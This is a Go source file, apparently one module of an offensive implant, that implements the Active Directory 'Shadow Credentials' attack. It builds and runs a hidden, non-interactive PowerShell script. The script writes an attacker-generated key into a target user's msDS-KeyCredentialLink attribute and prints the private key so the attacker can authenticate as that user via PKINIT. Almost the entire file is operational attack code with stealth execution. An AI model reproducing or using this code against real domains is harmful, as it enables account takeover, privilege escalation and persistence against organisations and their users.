//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
)

func shadowCreds(target string) (string, error) {
	if target == "" {
		return "", fmt.Errorf("usage: shadow_creds <target_user>")
	}
	ps := fmt.Sprintf(`
$TargetUser = "%s"
$results = @()

# Step 1: Verify target exists
try {
	$user = [ADSI]"LDAP://<SID=$(([System.Security.Principal.NTAccount]$TargetUser).Translate([System.Security.Principal.SecurityIdentifier]).Value)>"
	$results += "Target: $TargetUser ($($user.distinguishedName))"
} catch {
	$results += "FAILED: Cannot find user $TargetUser ($_)"
	Write-Output ($results -join [Environment]::NewLine)
	return
}

# Step 2: Generate raw public key (X.509)
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048
$pubKey = $rsa.ExportParameters($false)
$rawKey = New-Object Byte[] 0
$writer = New-Object System.IO.MemoryStream

# Build KeyCredential struct (simplified for AD)
# RFC format: KERB_KEY_DATA_KEYINFO + public key
try {
	$writer.Write([Byte[]]@(0x01,0x00,0x00,0x00),0,4) # Version
	$writer.Write([Byte[]]@(0x00,0x00,0x00,0x00),0,4) # Reserved
	# KeyId - random 16 bytes
	$keyId = New-Object Byte[] 16
	$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
	$rng.GetBytes($keyId)
	$writer.Write($keyId,0,16)
	# Key material - RSA public key (CAPI BLOB format)
	$blob = $rsa.ExportCspBlob($false)
	$writer.Write([BitConverter]::GetBytes([UInt32]$blob.Length),0,4)
	$writer.Write($blob,0,$blob.Length)
	$writer.Close()
	$rawKey = $writer.ToArray()
	$results += "Generated KeyCredential: $([Convert]::ToBase64String($rawKey).Substring(0,40))..."
} catch {
	$results += "Key generation failed: $_"
	Write-Output ($results -join [Environment]::NewLine)
	return
}

# Step 3: Attempt to write KeyCredentialLink attribute
try {
	$de = [ADSI]"LDAP://$($user.distinguishedName)"
	# Check if already has shadow creds
	$existing = $de.Properties["msDS-KeyCredentialLink"]
	$results += "Existing KeyCredentialLink entries: $($existing.Count)"
	
	# Add the new key
	$de.Properties["msDS-KeyCredentialLink"].Add($rawKey)
	$de.CommitChanges()
	$results += "SUCCESS: KeyCredentialLink written to $TargetUser"
	$results += "You can now authenticate using the private key with PKINIT."
	$results += "Private key (base64, export with ExportCspBlob):"
	$results += "PRIVKEY:" + [Convert]::ToBase64String($rsa.ExportCspBlob($true))
} catch {
	$results += "FAILED: Cannot write KeyCredentialLink ($_)"
	$results += "Requires WriteOwner or GenericWrite on target object."
}
Write-Output ($results -join [Environment]::NewLine)
`, target)
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if result == "" {
		result = "Shadow Credentials operation completed."
	}
	return result, err
}
